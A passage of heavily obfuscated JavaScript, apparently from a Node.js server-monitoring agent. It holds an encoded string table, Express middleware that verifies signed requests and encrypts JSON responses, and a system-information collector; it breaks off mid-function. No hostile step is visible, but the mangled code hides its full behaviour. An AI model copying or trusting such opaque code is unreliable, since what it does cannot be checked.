        'Bg9JyxrPB24',
        'BvfUrNq',
        'Dxb0Aw1L',
        'C3rHDgu',
        'z2XvAxq',
        'z2vUzxjHDgvqywLY',
        'B3bLBKnVBNrYB2W',
        'quTWs1q',
        'C2HVD1r1BM5LBa',
        'ze1WCfa',
        'Ec1UB25Jzq',
        'vgPAwee',
        'l2fWAs9MAwXLl2nW',
        'l2fWAs93CY8',
        'zwnPzxnFChvI',
        'wK5dzu8',
        'A1PMEwy',
        '6i635y+w56ob55Uy5Oc75A656yEp5AsX6lsLoIa',
        'vhrXENm',
        'AejTANu',
        'B3f3CvO',
        'tMzLtNe',
        'sMXTAfu',
        'l3n5CY9MCY9Jz3jVDxaVBwvTB3j5lMn1CNjLBNq',
        'qwDevKS',
        'tNPHDhy',
        'sNvPtfu',
        'Chv0',
        '6i635y+wienqvsdKV6hMGA/LPlhOTku6ia',
        'v1vKqLy',
        's05btuu',
        'tK9ju0vFs0vz',
        'zLDcyKu',
        'x2rLDK1HAM9Y',
        'zejTAvi',
        'BeL6DeC',
        'EMLWnJq',
        'Evj3tvG',
        'wMLWig5VDcbMB3vUzdOG',
        'BgXNAM4',
        'DhvUBMvSx2rVBwfPBG',
        's3LAyLu',
        'qMTRwhK',
        'DJeUma',
        'DgHLBG',
        'ChjVy2vZC0HHBMrZAgfRzq',
        'q2XVC2LUzYbJB25Uzwn0Aw9Uigr1zsb0BYbTAxnZAw5NihjLCxvLC3rFAwq',
        'l3bYB2mVy3b1Aw5MBW',
        'Dw5RBM93BIbLCNjVCG',
        'z1LyDNq',
        'EffXwfC',
        'tNPVBuW',
        'CMvHzfn5BMm',
        'ENvtzeG',
        'ruv6yvq',
        'AuPJyva',
        'igzHAwXLzdOG',
        'AezbBeS',
        'CKvAsgi',
        'CxrTwu0',
        'z2v0q29UDgfPBMvYtwvTB3j5',
        'BgLZDgvU',
        'veLJvNK',
        'Dw5SAw5Ru3LUyW',
        'uvfNufa',
        'z2v0zwDPza',
        'CMvHC29U',
        'lMjHzc0',
        'vwfOswG',
        'C3rHCNrZv2L0Aa',
        'C3rYAwn0lxrYyw5ZCg9YDc1Zzwn1CML0Eq',
        'rMTlv0S',
        'u3rUrNm',
        'B3rfD3u',
        'wfPLChe',
        'x2vTAxreyxrH',
        '6k6/6zEUia',
        'B25fEhbPCMvK',
        'zw5Kzwq',
        'mZyWma',
        'y3jLyxrLzef0',
        'C2vSzG',
        'v0POAhq',
        'C2f2zq',
        'vgvIwKu',
        'q1jptL9dsevds19jtLrfuLzbta',
        'z2vUzxjHDgvtAw5NBgu',
        'ls0Tls1cruDjtG',
        'twLTugu',
        'zMPHC2y',
        'CM93CW',
        'ue9tva',
        'DhjPBq',
        'A2LZyw1Hlxn0B3jL',
        'svvVCgG',
        'zLrisKy',
        'D29YA2rPCJ0VDMfYl2XPyI9KB2nRzxi',
        'sufJA3a',
        'uNnTD1i',
        'CgfYyw1Z',
        'x2HHBMrSzvjHD01LC3nHz2u',
        'vevnueTfwv9eruzbvuXux1rutf9it1vsuW',
        'qxv0AgvUDgLJyxrPB24GzMfPBgvKoIbjBNzHBgLKifrVA2vU',
        'y29UBMvJDgLVBNm',
        'qKrRzvi',
        'sw52ywXPzcbJCM9Uigv4ChjLC3nPB25ZoIa',
        'AxnZDwvYie9vig1PC21HDgnOoIa',
        'vgLTzxn0yw1Wigv4CgLYzwq6igrPzMy9',
        'BKrcEKq',
        'zfjbtha',
        'BNbyzNO',
        'BwfYA3m',
        'l2LUzgv4lMH0BwW',
        'tLjMt3C',
        'y29UDgvUDc1LBMnVzgLUzW',
        'CMvWBgfJzq',
        'DxjSzw5JB2rLza',
        'CMvQzwn0',
        'z2v0qxv0AfrHzW',
        'AxnbCNjHEq',
        'DxbNCMfKzq',
        'C29YDa',
        'quvtievUy3j5ChqGrxjYB3i6ieTLEsbTDxn0igjLigv4ywn0BhKGmZiGyNL0zxmGzM9YieffuY0YntyU',
        'zgv0zwn0twfYA3m',
        'sKj2CgG',
        'v3fQDgW',
        'rgHJyva',
        'Aw1Hz2uVCg5N',
        '8j+AGcblAxnHBweGqwDLBNqGtM9Kzs5QCYb2',
        'tgTdzwm',
        'r1DAy0G',
        'C3LZDgvT',
        'Dg9Rzw4',
        'Dg5UsMe',
        'mJa0',
        'q3jLyxrPBMCGrxHWCMvZCYbHChaUlI4',
        'zMzkqMu',
        'zxHWAxjLC19HDa',
        'rwfoq1i',
        'DxnL',
        'AgHqtLi',
        'CMvSyxrPDMu',
        'zxrHzW',
        'BvrfuuW',
        'vhLNvg4',
        'w1rHC2TtDg9Yzv0G8j+sVIdKU7VLIQhMJihKUyxLJjBLT7lLKk/NLkG6ia',
        'vMDPu28',
        'BLDoqw8',
        'ywXWBLbYB3rVy29S',
        'swHuAwq',
        'tufyx1rbu0TFte9hx1njwKu',
        'CNvUuhjVBwLZzq',
        'vw5ZDxbWB3j0zwqGCgvYBwLZC2LVBIbMB3jTyxqSig9UBhKGB2n0ywWGC3rYAw5NCYbHCMuGC3vWCg9YDgvK',
        'Ahf2Du4',
        'DhvUBMvSihjLz2LZDhjHDgLVBIbMywLSzwq6ia',
        'm3WYFdr8mhWX',
        'D0Hpu1C',
        'z2v0ugvLCKnLCNrPzMLJyxrL',
        'w1rHC2TtDg9Yzv0G4P2mios/NEwTMowKSEI0PsaO5yAf5A2y5lU75yQH5lIn5y+x5B2X5zonktOG',
        'zNjmzNu',
        's01preu',
        'vuvMyvO',
        'ignVBM5Ly3rPB24Gy2XVC2vKoIa',
        'Ahr0Chm6lY92nI5PzgvUDc5Tzq',
        'zMXHDa',
        'Ec1MAwXLlxbHDgG',
        'w0Tnt0rfxsdWN5QaieTnt0rfpte6iowqR+wkQoAxTUIhQUwkQowiM+w7UUs4ToAxTUMAP+MbKW',
        'sxPZqwy',
        'zhPvy3u',
        'qKjTtvq',
        'zNjVBq',
        'mhWXFdD8nhW1Fdz8m3WY',
        'zNjVBuj5DgvbCNjHEq',
        '8j+sPsdMJ6hMIyVLPlhOTkxOR6BMG4u6ia',
        'qKjdsLu',
        'C3LZDgvTx2j1C19ZB2nRzxq',
        'CMvWB3j0u2H6ywW',
        'z2Xzvwy',
        'ChjPBNrLza',
        'A1bhyuW',
        'z2v0rNvSBfLLyxi',
        'CMvHzfvjBNrcrq',
        'DMLYDhvHBgL6yxrPB24',
        'BMLUvwm',
        'v2LJshi',
        'CMjmseS',
        'DxrJtM0',
        'ANn1BNa',
        'swPvC2i',
        'AgvHzgvY',
        'y29UDhjVBa',
        'AxnZDwvY',
        'AgvHzgvYCW',
        'r0vu',
        'wKTUvNi',
        'C0nAqLy',
        'ChjVyW',
        'C3rYAw5N',
        'x3jLywrmAw1PDgvK',
        'qMfKihnPz25HDhvYzq',
        'A2LZyw1HlxDZlxrVA2vUlxyX',
        'DMfYEq',
        't3HOvwi',
        'icJMIjdLIP8P',
        'zMLUAxnOzwq',
        'yxbWBgLJyxrPB24VANnVBG',
        'zwzvqwy',
        'A2v5CY9Hz2vUDf9Ly2rZyv9WDwiUCgvT',
        'CKvKvLq',
        'EfPNuxC',
        'qKD2EKi',
        'C3rYzwfTCW',
        'CMvQzwn0zwq',
        'Bw1jDMK',
        'Cwr0C0G',
        'B09qveC',
        'rxjQD3e',
        'ChvIBgLJx2i2na',
        'B0vNugC',
        'CM90yxrLt3bLCMf0Aw9UywXtzwnYzxrZ',
        'txvcvuK',
        'lcdKUjtPMPtNPRVLPlhOTku6ia',
        'zxfYswq',
        'Exv1uLK',
        'l2fWAs90yxnRl3n0yxr1CW',
        'zuj6uge',
        'zgDlr20',
        'x3nWBgL0qw5KrMLUAxnO',
        'wc1uAw1LC3rHBxa',
        'uxfdEeG',
        'vg9NDeG',
        'CMvHBhbHDgHtEw5J',
        'CMvHzhLtDgf0zq',
        'BKzJywq',
        'Dgv4Da',
        'tMnYy2q',
        'DxjS',
        'D0XQs0i',
        'y3vYBc84lJuUma',
        'Cevwrxm',
        'EerOy1C',
        'zxHWzwn0zwqGq2fWj24GuhjVDg8GC3rYDwn0ihbVAw50zxi',
        'u3bSAxq',
        're1ou3u',
        'rKTjrKK',
        '8j+sPsbBqM9KEsbqyxjZzsbfCNjVCL06ia',
        'ywn0AxzHDgu',
        'r3bNu3K',
        'zxHLy3v0zq',
        'oMf1DgHVCML0Eq',
        'y3vYCMvUDeXLDMvS',
        'DhrSig11C3qGyMuGyw4GAw50zwDLCIbIzxr3zwvUideGyw5Kia',
        'Eg9tAfi',
        'EgfQCwm',
        'x3j1BLrLCM1PBMfS',
        'tuDZvxu',
        'Cgf0Adi',
        'y3jLyxrLsw50zxjMywnL',
        'v1PJyu0',
        'y29UDgvUDa',
        'DKDyENO',
        'Bw92zuzPBgvZ',
        't2HQsxu',
        'vgvTCeTLEu1HBMfNzxiGAw5PDgLHBgL6zwq',
        'Bfvvr0O',
        'yNL0zuXLBMD0Aa',
        'A0rSsee',
        'Cfj0s1q',
        'BwfPBG',
        'EKr1B3a',
        'B3jPz2LU',
        'zgLYzwn0B3j5',
        'x3jLCMvNAxn0zxi',
        'v3LwwMi',
        'rwTjtwu',
        'Eevdqwi',
        'BLrjzeS',
        'uenIvKC',
        'twLZC2LUzYbJAhvUAYa',
        'vK1Xr0K',
        'C3bSAwnL',
        'ywvZlti1nI1Ny20',
        'BM9Uy2u',
        'tM9Uzq',
        'Ahr0CdOVlZeYnY4WlJaUmtO',
        'rgzkCvi',
        'wMz2vLe',
        'Eg5VyM4',
        'y3jLyxrL',
        'z2v0rMLSzvbLCM1PC3nPB25Z',
        'ALbOqM8',
        'ufDRB3i',
        'wMDMvM0',
        'rgvJCNLWDfDPDgHbza',
        'l3j1BI8Uy29UDgfPBMvYzw52',
        'teHPDee',
        'zMfSC2u',
        'shHXuNy',
        'BwT6s2O',
        'C3rVCMuUzw5J',
        'vevnueTfwv9nqvHFvfrmx0Hpvvjt',
        'weP5z1e',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTt3jPz2LU',
        'BMrItg4',
        'CMvNAxn0CMf0Aw9UrMfPBgvK',
        'r2HouKq',
        'EKj3yve',
        'sKHJEhq',
        'u1zyBKi',
        'l2fWAs93CY8Q',
        'AxPmB3C',
        'uvjiteG',
        'ywnJzxb0lwnOyxjZzxq',
        'sgLnuNu',
        'D3jPDgveB21HAw5gAwXL',
        'x2nYyZmY',
        'zw5K',
        'C2v0t25LDgLTzvrHC2TZ',
        'r2TSrxO',
        'AuX6v0q',
        'zgLZAW',
        'D2fZBsbZDhjLyw1PBMCGy29TCgLSzsbMywLSzwq',
        'rKLmrv9st09u',
        'x3n0yxr1C19JywnOzv90Aw1L',
        'B25LDgLTzxrHC2TZx2XVzW',
        'yK5Xwvu',
        'sKL6BwG',
        'C2HHmJu2',
        'BhfKruS',
        'quvtierLy3j5ChqGrxjYB3i6ieTLEsbTDxn0igjLigv4ywn0BhKGmZiGyNL0zxmGzM9YieffuY0YntyU',
        'yKXtywu',
        'z2v0tg9JywXjuhy2',
        'x2DLDenVBMzPz1zHBhvL',
        't2rHBw0',
        'u1nRuMq',
        'DgvZDa',
        's0P5ALi',
        'Bg9Hza',
        'uLbMDLO',
        'C2HLBgW',
        'q2jJvLK',
        'rvzWCva',
        'tKPkrwi',
        'Exjlrw0',
        'wwLlz2W',
        'l2jPBI9ZAa',
        'yMfKigfJy291BNqGDgfNig9YigHVC3rUyw1L',
        'uhbMs0y',
        'BeX1BKK',
        'DfvjzMi',
        'zxHWzwn0zwqGq09oveLovufusu9oigzYyw1L',
        'vwHlwui',
        'ChzbEM8',
        'Cwf3thu',
        'ywXSB2m',
        'wMrXs1m',
        'rLnPBKW',
        'D0TMvKO',
        'tM9Qs04',
        'r0vctxq',
        'CfLbBhO',
        'zhPequy',
        'kg5VBMuP',
        'rLb4z2G',
        'g1SZmw1BrKfuquWGrvjst1jDg1SWBsdMOlJLV4pNU4JNQ6/KVP3OTzyGkhb0EsKG5yQG6l295AsX6lsL77Ym56Il5BQp57Ui5Q2I77Yb',
        'Axb2na',
        'B3bLBLDYAxrLCG',
        'wMHYzue',
        'l2fWAs90yxnRl29UzxrPBwu',
        'Dwv1vKi',
        'zM9UDc93B2zMmG',
        'l2fWAs9MAwXLl2XPC3q',
        'zMXAEKe',
        'y29UC3rHBNrZ',
        'DMLH',
        'qNDvEw0',
        'EufhA08',
        'DurvtwW',
        'jeHptuu',
        'sw52ywXPzcbIB2r5igzVCM1HDdOG',
        'ChvZAa',
        'rfLnzuK',
        'sgfqseu',
        'y29UBKLUzgv4',
        'yxnZzw1IBgvcyxnLsw5MBW',
        'vefts19usu1ft1vu',
        'Edi1nte5',
        'rMf0ywWGzxjYB3iGAw4GBwfPBIGPoG',
        'vNPfAK8',
        'z2v0sg91CNm',
        'v2vIu29JA2v0ihjLCxvLC3qGvvjmoIa',
        'D3jPDgvgAwXLu3LUyW',
        'Dw56AxbbCMnOAxzL',
        'D0L5DKO',
        'teLHB2K',
        'BuzKuhy',
        'ANfMENG',
        'EKvgqMW',
        'tfz4yK4',
        'txfWAKy',
        'AKfoDNe',
        'y1zvs2m',
        'vwn0wwG',
        'u3DoDKG',
        'AgfUzhnOywTL',
        'CLfZsLC',
        'BM8GDhvUBMvSigzVDw5Kig9UihbVCNqG',
        'DvbNrNi',
        'CM1tEw5J',
        'sw5PDgLHBgL6Aw5NienYExb0B01HBMfNzxiUlI4',
        'tMv4DxmTuhL0Ag9U',
        'sfbbq0SGzhLUyw1PyYbPBMrLEcbVDxqGB2yGCMfUz2u',
        'rhHjqLa',
        'vevVBeO',
        'iowKSEI0PtOG',
        'z0Pltfy',
        'D2fPDgvYCW',
        'C1rTqvq',
        'ywDLBNq',
        'y2XLyxjdCM9Utg9NCW',
        'ze9NCuK',
        'zgnQEe4',
        'y29UBMvJDgLVBIbJBg9Zzwq',
        'DNHOuLa',
        'C2vUzenPCgHLCG',
        '4P2miowqR+wkQoEgLoAwRtOGruneu0eG5ywS6zkL57Y65AsX5OIw6kEJ5P6q5AsX6lsL77Ym6z2EierfqLvhioAOOEw8J+s4I+AlKUE7NEwqR+wkQa',
        'yNjstgi',
        'B0nZs2K',
        'CxfOtLG',
        'u0vtu0LptL9lrvK',
        'y3jVBG',
        'zxf1ywXZ',
        'Ec1LBMnYExb0zwq',
        'qNvrzee',
        'Dhjiq3O',
        'zgvZDf9WyxrO',
        'CNvU',
        'C2v0vgLTzw91Da',
        'AxnbyNnVBhv0zq',
        'CvPQr1G',
        'zg5iDLG',
        'ChjVDg9JB2W',
        'zhrtv3y',
        'su1wBMq',
        '6i635y+w5yAf5A2y5l+H5OgV5AsX6lsLoIa',
        'x21HCMTqDgvYB2rHy3r5Ba',
        'zhrtsvy',
        'yMfKihr1BM5LBcbPza',
        'C2nOzwr1Bgu',
        'BgvUz3rO',
        'x3bYB2nLC3nuzxjTAw5HBe1LC3nHz2u',
        'zMLUAxnO',
        'CM91BMq',
        'zhPQAwm',
        'vvjKyMW',
        'ywDL',
        'uf9trvjwrvjFte9dqvrjt049',
        'yLfrzfm',
        'CgXHDgzVCM0',
        'qKftruLorK9Fte9dquXFvfrm',
        'zgLZA190B3rHBa',
        'veD2AvK',
        'BgLZDa',
        'rMHzDKC',
        's052rLC',
        'zgvSzxrLrg9TywLUrMLSzq',
        'B2rZueq',
        'y3jLyxrLsgfZAa',
        'CK1bEgG',
        'y2jiEuK',
        'yxv0Ag9YAxPHDgLVBG',
        'uNbvB0m',
        'wvLqCxm',
        'rxvNs1y',
        'runeu0fFufvcteLdx0Tfwv9qru0',
        'AxvUDva',
        'CgvLCK1HEezYyw1L',
        'l3j1BG',
        'C2LUAhe',
        'zMfTAwX5',
        'DxLvCfK',
        'l2fWAs90yxnRl2XVzY9VBMv0Aw1L',
        'AMfYENq',
        'Ahr0Chm6lY9PCgLUzM8UAw8VAxa',
        'zKvdt1m',
        've5ID2y',
        'EunIB08',
        'q2X2Bfe',
        'AfjKsMy',
        'quvtierLy3j5ChqGrxjYB3i6ia',
        'ueDHtfa',
        '8j+KNsdLVidLP4SGtM9PC2uG5yQG5A+g5O+H5OMllI4U'
    ];
    a0a = function () {
        return hb;
    };
    return a0a();
}
function a0S(a, b, c, d, f) {
    const bK = a0aY, g = { 'OCDoS': bK(0x729) };
    return !c && (c = a0k[bK(0x7b5)](g['OCDoS'])[bK(0x3cf)](Buffer['alloc'](0x0))['digest'](bK(0x546))), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0T(a, b = null) {
    const bL = a0aY, c = {
            'pEAtM': bL(0x792),
            'Gahog': bL(0x70a),
            'aPzCI': function (d, f) {
                return d === f;
            },
            'XYRTm': bL(0x6a7),
            'XtwEi': 'Content-Length',
            'jhjJe': 'Content-Type',
            'zEPcK': function (d, f) {
                return d === f;
            },
            'KNvFW': bL(0x1a8),
            'GKjBZ': function (d, f) {
                return d === f;
            },
            'crFCe': bL(0x5ef),
            'MhyDg': function (d) {
                return d();
            },
            'Wxadz': bL(0x36d),
            'aAuMn': bL(0x8b5),
            'ljubo': '/api/status',
            'UkbCM': bL(0x5ec),
            'IjUsb': 'X-Nonce',
            'llgjn': bL(0x5ac),
            'HxqRv': bL(0x6c6),
            'RTYdR': bL(0x8c6),
            'UdCAB': function (d, f) {
                return d !== f;
            },
            'lIztG': bL(0x1f7),
            'Clmxv': 'utf-8',
            'Mqane': function (d, f) {
                return d > f;
            },
            'tSTYE': 'hex',
            'rcXTA': function (d, f) {
                return d === f;
            },
            'wlJQZ': function (d, f) {
                return d === f;
            },
            'trcnG': bL(0x8b6),
            'rnuAn': 'base64',
            'HaRmn': 'eyJ'
        };
    return async (d, f, g) => {
        const bN = bL, h = {
                'aipFy': function (o, p) {
                    const bM = a0b;
                    return c[bM(0x443)](o, p);
                },
                'TIcVy': c[bN(0x11d)],
                'IMVnd': c['pEAtM'],
                'yJrqJ': c[bN(0x807)],
                'IAckp': c[bN(0x50b)],
                'scvJf': function (o, p) {
                    const bO = bN;
                    return c[bO(0x336)](o, p);
                },
                'glUit': c[bN(0x7b2)],
                'ninUc': function (o, p) {
                    const bP = bN;
                    return c[bP(0x831)](o, p);
                },
                'HDaoQ': function (o, p) {
                    const bQ = bN;
                    return c[bQ(0x831)](o, p);
                },
                'kPGaL': bN(0x3ef),
                'XaSXr': bN(0x8b6),
                'GEBMt': bN(0x20b),
                'JQvsf': bN(0x6af)
            };
        if (d[bN(0x312)][bN(0x627)](c[bN(0x11c)]))
            return c[bN(0x59f)](g);
        const i = f['send'];
        f['send'] = function (o) {
            const bR = bN;
            if (a0P[bR(0x17a)]) {
                const p = h[bR(0x7e2)](typeof o, h['TIcVy']) ? o : Buffer[bR(0x7d4)](o) ? o : JSON[bR(0x548)](o);
                return f['set'](h[bR(0x79d)], bR(0x70a)), f[bR(0x50d)](h[bR(0x876)], Buffer[bR(0x6eb)](p)[bR(0x491)]()), i[bR(0x49e)](this, p);
            }
            if (f[bR(0x1f2)](h[bR(0x643)]) && f[bR(0x1f2)](h[bR(0x643)])['includes']('application/json'))
                try {
                    if (d[bR(0x897)]) {
                        let q;
                        if (h[bR(0x42d)](d[bR(0x312)], bR(0x25b))) {
                            const r = h[bR(0x42d)](typeof o, h[bR(0x620)]) ? JSON[bR(0x7f4)](o) : o;
                            let s = null;
                            d['key_source'] === h[bR(0x5e6)] && b && (s = b[bR(0x27f)]());
                            const t = a[bR(0x13f)](r, s);
                            q = h[bR(0x699)](typeof t, bR(0x6a7)) ? t : JSON[bR(0x548)](t);
                        } else {
                            const u = Buffer[bR(0x7d4)](o) ? o : h['HDaoQ'](typeof o, bR(0x6a7)) ? Buffer[bR(0x68c)](o, h['kPGaL']) : Buffer[bR(0x68c)](JSON[bR(0x548)](o), h[bR(0x695)]);
                            q = a['encryptData'](u, Buffer[bR(0x68c)](a0P[bR(0x78f)], bR(0x880)));
                        }
                        return f['set'](h[bR(0x79d)], h['XaSXr']), f[bR(0x50d)](h[bR(0x749)], a0P[bR(0x8fb)]), f[bR(0x50d)](h['yJrqJ'], Buffer[bR(0x6eb)](q, h[bR(0x695)])['toString']()), i[bR(0x49e)](this, q);
                    } else {
                        const v = typeof o === h['TIcVy'] ? o : JSON[bR(0x548)](o);
                        return f['set'](h['yJrqJ'], Buffer['byteLength'](v, h[bR(0x695)])[bR(0x491)]()), i[bR(0x49e)](this, v);
                    }
                } catch (w) {
                    if (!f['headersSent']) {
                        const x = JSON[bR(0x548)]({ 'error': bR(0x42a) + w['message'] });
                        return f[bR(0x59c)](0x1f4), f[bR(0x50d)](h[bR(0x643)], h[bR(0x2f2)]), f[bR(0x50d)](bR(0x2d3), Buffer['byteLength'](x, h[bR(0x695)])[bR(0x491)]()), i[bR(0x49e)](this, x);
                    }
                    throw w;
                }
            return i[bR(0x49e)](this, o);
        };
        const j = f[bN(0x71e)];
        f[bN(0x71e)] = function (...o) {
            const bS = bN;
            return a0P[bS(0x17a)] && !f[bS(0x1f2)](c['pEAtM']) && f[bS(0x50d)](c['pEAtM'], c[bS(0x2ed)]), j['apply'](this, o);
        };
        if (c[bN(0x443)](d[bN(0x3da)], c['Wxadz']) || c['zEPcK'](d['method'], c['aAuMn']))
            return a0P['DEBUG'] && f[bN(0x50d)](c[bN(0x39f)], bN(0x70a)), c[bN(0x59f)](g);
        d[bN(0x897)] = ![];
        const k = [
            bN(0x25b),
            c[bN(0x1b8)]
        ];
        if (a0P[bN(0x17a)])
            return d[bN(0x897)] = !![], c[bN(0x59f)](g);
        const l = d[bN(0x6a2)][c[bN(0x8bc)]] || d[bN(0x6a2)][c[bN(0x69e)]], m = d[bN(0x6a2)][c[bN(0x609)]] || d[bN(0x6a2)][c[bN(0x70b)]], n = d[bN(0x6a2)][c[bN(0x91e)]] || d['headers'][bN(0x800)];
        if (!l || !m || !n)
            return k['includes'](d[bN(0x312)]) ? g() : f[bN(0x59c)](0x191)[bN(0x80b)]({ 'error': 'Missing\x20auth\x20headers' });
        try {
            let o = Buffer['alloc'](0x0);
            if (c['UdCAB'](d[bN(0x312)], c[bN(0x605)])) {
                if (Buffer[bN(0x7d4)](d[bN(0x411)]))
                    o = d[bN(0x411)];
                else {
                    if (typeof d[bN(0x411)] === c[bN(0x11d)])
                        o = Buffer[bN(0x68c)](d[bN(0x411)], c[bN(0x26f)]);
                }
            }
            const p = c['Mqane'](o[bN(0x7a3)], 0x0) ? a0k[bN(0x7b5)](bN(0x729))[bN(0x3cf)](o)['digest'](c[bN(0x34a)]) : '', q = b ? b['getActiveEcdsaVk']() : null, r = a['verifySignature'](d[bN(0x3da)], d[bN(0x312)], p, l, m, n, q);
            d['is_authenticated'] = !![], d[bN(0x927)] = c[bN(0x831)](r, c[bN(0x7b2)]) ? c[bN(0x7b2)] : bN(0x7e3);
        } catch (s) {
            return k['includes'](d['path']) ? c['MhyDg'](g) : f['status'](0x191)[bN(0x80b)]({ 'error': bN(0x92a) + s[bN(0x49d)] });
        }
        if (d[bN(0x411)] && c[bN(0x86d)](typeof d[bN(0x411)], c[bN(0x11d)])) {
            const t = c['wlJQZ']((d[bN(0x6a2)]['x-aes-encrypted'] || '')[bN(0x1a2)](), c[bN(0x910)]);
            try {
                if (t && d[bN(0x897)]) {
                    const u = Buffer['from'](a0P[bN(0x78f)], c[bN(0x31e)]), v = a['decryptData'](d['body'], u);
                    d[bN(0x411)] = JSON[bN(0x7f4)](v);
                } else {
                    if (d[bN(0x411)][bN(0x627)](c[bN(0x142)])) {
                        const w = Buffer[bN(0x68c)](d[bN(0x411)], c['rnuAn'])['toString'](bN(0x30c));
                        d[bN(0x411)] = JSON[bN(0x7f4)](w);
                    } else {
                        if (d[bN(0x411)][bN(0x63e)]()['startsWith']('{') || d['body'][bN(0x63e)]()[bN(0x627)]('['))
                            d[bN(0x411)] = JSON['parse'](d['body']);
                        else {
                            if (d[bN(0x411)][bN(0x63e)]() === '')
                                d[bN(0x411)] = {};
                        }
                    }
                }
            } catch (x) {
                return a0D['error'](bN(0x6d7) + x[bN(0x49d)]), f[bN(0x59c)](0x190)[bN(0x80b)]({ 'error': bN(0x75d) + x['message'] });
            }
        }
        c[bN(0x59f)](g);
    };
}
class a0U {
    constructor() {
        const bT = a0aY, a = {
                'nYQwN': function (b, c) {
                    return b / c;
                }
            };
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bT(0x10f)] = 0x0, this['totalNetworkDown'] = 0x0, this['lastNetworkTime'] = a[bT(0x8f4)](Date[bT(0x855)](), 0x3e8);
    }
    async [a0aY(0x61e)]() {
        const bU = a0aY, a = {
                'RxkPG': bU(0x157),
                'OhjIu': bU(0x3ef),
                'PWkor': bU(0x434),
                'SVXnB': function (d, f, g) {
                    return d(f, g);
                },
                'bLSae': bU(0x5f9),
                'XUcAn': function (d, f, g) {
                    return d(f, g);
                },
                'taTpd': bU(0x893),
                'cFlFr': function (d, f) {
                    return d === f;
                },
                'WUzSm': function (d, f) {
                    return d(f);
                },
                'DhcaP': function (d, f) {
                    return d - f;
                },
                'yhIOV': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bU(0x321)](a[bU(0x4c2)], a[bU(0x6e8)]))[bU(0x63e)]();
            b = d === a[bU(0x705)] ? null : parseInt(d, 0xa), c = a[bU(0x716)](parseInt, (await a0m[bU(0x321)](a[bU(0x72c)], a[bU(0x6e8)]))[bU(0x63e)](), 0xa);
        } catch {
            try {
                b = a[bU(0x4e8)](parseInt, (await a0m[bU(0x321)](bU(0x571), a[bU(0x6e8)]))[bU(0x63e)](), 0xa), c = parseInt((await a0m['readFile'](a[bU(0x87f)], a['OhjIu']))[bU(0x63e)](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0u['mem']();
                b = f[bU(0x3fc)], c = f[bU(0x2a0)];
            }
        }
        if (b === null) {
            const g = await a0u[bU(0x3f0)]();
            b = g[bU(0x3fc)], (a[bU(0x307)](c, null) || a[bU(0x38e)](isNaN, c)) && (c = g[bU(0x2a0)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[bU(0x660)](b, c),
            'free': a[bU(0x4d2)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aY(0x5c5)]() {
        const bV = a0aY, a = await this[bV(0x48d)](), b = await this[bV(0x4c0)](a['virtualization']), c = await this['collectNetInfo'](), d = a0U[bV(0x762)](a, b, c);
        return a0D[bV(0x925)](bV(0x81d) + JSON[bV(0x548)](d, null, 0x2), 0x1), d;
    }
    static [a0aY(0x762)](a, b, c) {
        const bW = a0aY;
        return {
            'arch': a[bW(0x88e)],
            'cpu_cores': a[bW(0x1dd)],
            'cpu_name': a['cpu_name'],
            'disk_total': b[bW(0x7ae)],
            'gpu_name': a[bW(0x581)],
            'ipv4': c[bW(0x74f)] ?? null,
            'ipv6': c[bW(0x42c)] ?? null,
            'mem_total': b[bW(0x2f0)],
            'os': a['os'],
            'kernel_version': a[bW(0x2ab)],
            'swap_total': b[bW(0x931)],
            'version': a[bW(0x497)],
            'virtualization': a[bW(0x698)],
            'marks': Array[bW(0x659)](a['marks']) ? [...a['marks']] : []
        };
    }
    static [a0aY(0x7e1)]() {
        const bX = a0aY;
        return {
            'arch': '',
            'cpu_cores': 0x0,
            'cpu_name': '',
            'gpu_name': '',
            'os': '',
            'kernel_version': '',
            'version': a0P[bX(0x8fb)],
            'virtualization': '',
            'marks': []
        };
    }
    static [a0aY(0x203)]() {
        return {
            'disk_total': 0x0,
            'mem_total': 0x0,
            'swap_total': 0x0
        };
    }
    static ['netFallback']() {
        return {
            'ipv4': null,
            'ipv6': null
        };
    }
    async [a0aY(0x48d)]() {
        const bY = a0aY;
        let a = {}, b = {};
        try {
            a = await a0u[bY(0x2e1)]();
        } catch (d) {
            a0D['debug'](bY(0x5fe) + d['message'], 0x1);
        }
        try {
            b = await a0u[bY(0x3b8)]();
        } catch (f) {
            a0D[bY(0x925)](bY(0x8d8) + f['message'], 0x1);
        }
        let c = '';
        try {
            c = await this[bY(0x86b)]();
        } catch (g) {
            a0D[bY(0x925)](bY(0x519) + g[bY(0x49d)], 0x1);
        }
        return {
            'arch': a0p[bY(0x88e)]() || '',
            'cpu_cores': a['cores'] || 0x0,
            'cpu_name': a[bY(0x167)] || '',
            'gpu_name': '',
            'os': ((b[bY(0x7e4)] || '') + '\x20' + (b[bY(0xf5)] || ''))[bY(0x63e)](),
            'kernel_version': b[bY(0xf2)] || '',
            'version': a0P[bY(0x8fb)],
            'virtualization': c,
            'marks': this[bY(0x65d)]()
        };
    }
    async [a0aY(0x4c0)](a) {
        const bZ = a0aY;
        let b = 0x0;
        try {
            b = (await a0u[bZ(0x3fb)]())[0x0]?.[bZ(0x8fe)] || 0x0;
        } catch (d) {
            a0D[bZ(0x925)](bZ(0x5f3) + d[bZ(0x49d)], 0x1);
        }
        let c = {
            'total': 0x0,
            'swaptotal': 0x0
        };
        try {
            c = await this[bZ(0x61e)]() || c;
        } catch (f) {
            a0D[bZ(0x925)](bZ(0x79e) + f[bZ(0x49d)], 0x1);
        }
        return {
            'disk_total': b,
            'mem_total': c[bZ(0x3fc)] || 0x0,
            'swap_total': c[bZ(0x8a8)] || 0x0
        };
    }
    async [a0aY(0x286)]() {
        const c0 = a0aY, a = {
                'bHJRE': function (d, f) {
                    return d === f;
                },
                'uFKSS': c0(0x6b6),
                'flZzA': function (d, f) {
                    return d === f;
                },
                'zFteE': c0(0x2ff),
                'bmClo': function (d, f) {
                    return d === f;
                }
            }, [b, c] = await Promise[c0(0x915)]([
                this[c0(0x266)](),
                this[c0(0x4a5)]()
            ]);
        if (a['bHJRE'](b['status'], c0(0x6b6)))
